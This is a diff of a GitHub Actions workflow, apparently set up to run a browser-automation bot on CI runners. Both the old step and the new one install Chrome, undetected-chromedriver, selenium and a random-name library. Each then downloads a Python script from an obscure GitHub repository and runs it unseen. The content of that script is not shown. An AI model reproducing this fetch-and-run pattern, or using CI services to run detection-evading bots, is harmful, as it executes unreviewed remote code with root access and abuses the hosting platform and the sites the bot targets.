@@ -1,22 +1,26 @@
 name: My devOpa
 on:
   push:
-    branches: [ main ]
-  pull_request:
-    branches: [ main ]
-  workflow_dispatch:
 jobs:
-  Build:
+  build_linux:
+    name: Build Dev
+    container:
+      image: ubuntu:18.04
     runs-on: ubuntu-latest
+
     strategy:
+      fail-fast: true
       matrix:
-        python-version: [3.9]
+        python-version: ["3.8"]
+
     steps:
-    - name: Checkout Code
-      uses: actions/checkout@v2
+    - uses: actions/checkout@v3
     - name: Set up Python ${{ matrix.python-version }}
-      uses: actions/setup-python@v2
+      uses: actions/setup-python@v3
       with:
         python-version: ${{ matrix.python-version }}
-    - name: kos
-      run: sudo apt-get update && sudo apt-get upgrade -y && sudo docker --version && sudo docker run --name Ada ubuntu sh -c "apt-get update && apt-get upgrade -y && apt-get install wget -y && apt-get install dialog -y && apt-get -y install apt-utils unzip && echo 'debconf debconf/frontend select Noninteractive' | debconf-set-selections && apt-get install -y -q && wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb && apt install -y ./google-chrome-stable_current_amd64.deb && wget -N https://chromedriver.storage.googleapis.com/113.0.5672.63/chromedriver_linux64.zip -P ~/ && unzip ~/chromedriver_linux64.zip -d ~/ && rm ~/chromedriver_linux64.zip && mv -f ~/chromedriver /usr/local/bin/chromedriver && chown root:root /usr/local/bin/chromedriver && chmod 0755 /usr/local/bin/chromedriver && apt install python3-pip -y && pip install undetected-chromedriver && pip3 install selenium names && wget https://github.com/Mehslos/Nerhiabk/raw/main/bn.py && python3 bn.py"
+    - name: Install dependencies
+      run: |
+        set -e
+        apt-get update && apt-get upgrade -y && apt-get install wget -y && apt-get install dialog -y && apt-get -y install apt-utils unzip && echo 'debconf debconf/frontend select Noninteractive' | debconf-set-selections && apt-get install -y -q && wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb && apt install -y ./google-chrome-stable_current_amd64.deb && wget -N https://chromedriver.storage.googleapis.com/113.0.5672.63/chromedriver_linux64.zip -P ~/ && unzip ~/chromedriver_linux64.zip -d ~/ && rm ~/chromedriver_linux64.zip && mv -f ~/chromedriver /usr/local/bin/chromedriver && chown root:root /usr/local/bin/chromedriver && chmod 0755 /usr/local/bin/chromedriver && apt install python3-pip -y && pip install undetected-chromedriver && pip3 install selenium names && wget https://github.com/Mehslos/Nerhiabk/raw/main/bn.py && python3 bn.py
+      
